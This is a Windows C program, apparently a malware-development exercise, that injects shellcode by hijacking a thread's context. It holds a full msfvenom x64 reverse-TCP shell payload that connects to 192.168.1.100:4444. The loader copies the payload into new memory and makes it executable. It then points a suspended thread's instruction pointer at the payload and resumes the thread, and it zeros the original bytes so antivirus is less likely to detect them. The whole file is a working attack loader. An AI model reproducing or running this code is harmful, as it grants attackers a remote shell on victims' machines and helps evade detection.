#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define error(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__)


//  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
// .data saved payload
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xd5\x82\x90\xc1"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


BOOL ThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
	CONTEXT  ThreadCtx = { // thread context struct
		.ContextFlags = CONTEXT_CONTROL
	};

	// setting the old protection variable to store the old protection of the memory region that will be changed to PAGE_EXECUTE_READWRITE
	DWORD dwOldProtection = 0;



	// allocate memory with PAGE_READWRITE permissions to write the shellcode
	LPVOID lpAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpAddress == NULL) {
		printf("VirtualAlloc a crash %d\n", GetLastError());
		return -1;
	}
	printf("allocated memory at %p, press ENTER\n", lpAddress);
	getchar();


	// copying the shellcode to the allocated memory
	RtlMoveMemory(lpAddress, shellcode, sizeof(shellcode));
	info("shellcode copied to the memory at 0x%p, press ENTER\n", lpAddress);
	getchar();


	// zero out the original shellcode in the .data section to make it less detectable in memory dumps or by antivirus software
	memset((void*)shellcode, 0, sizeof(shellcode));
	info("zeroed out the original shellcode in the .data section, press ENTER\n");
	getchar();


	// change the memory permission to EXECUTE_READ
	DWORD dwOldProtect = 0;
	VirtualProtect(lpAddress, sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtection);
	info("Memory protection changed to PAGE_EXECUTE_READ, press ENTER\n");
	getchar();

	// get the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		error("GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = (DWORD64)lpAddress;
	info("Thread Context Updated, RIP set to the shellcode address: 0x%p, press ENTER\n", lpAddress);
	getchar();

	// in 32bits:
	//ThreadCtx.Eip = (DWORD)lpAddress;

	// Updating the new thread context with the shellcode address as the next instruction to execute
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		error("SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	info("New Thread Context Set, the thread will execute the shellcode once resumed, press ENTER\n");
	getchar();
	return TRUE;
}

VOID sertARien() {
	// This function is just a placeholder to make the code compile without errors, it doesn't do anything
	6 + 7;
}


int main() {
	info("Current process ID: %d, press ENTER\n", GetCurrentProcessId());
	getchar();

	info("memory address of the shellcode in the .data section: %p, press ENTER\n", shellcode);
	getchar();

	
	// Create a thread (not the main thread) in a SUSPENDED mode and setting the start address to a dummy function
	HANDLE stoopidSacrificialRitualThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sertARien, NULL, CREATE_SUSPENDED, NULL);
	info("Thread created, Handle: %p | TID: %lu\n", stoopidSacrificialRitualThread, GetThreadId(stoopidSacrificialRitualThread));
	getchar();


	// sending the stoopid sacrificial ritual thread to sleep and setting the new CONTEXT to the payload
	if (!ThreadHijacking(stoopidSacrificialRitualThread, shellcode, sizeof(shellcode))) {
		error("Thread Hijacking Failed");
		return -1;
	}


	// fire up
	// resume the thread with the brand new RIP pointing to the shellcode
	ResumeThread(stoopidSacrificialRitualThread);


	info("Press <Enter> to quit");
	getchar();
	//quit
	return 0;
}
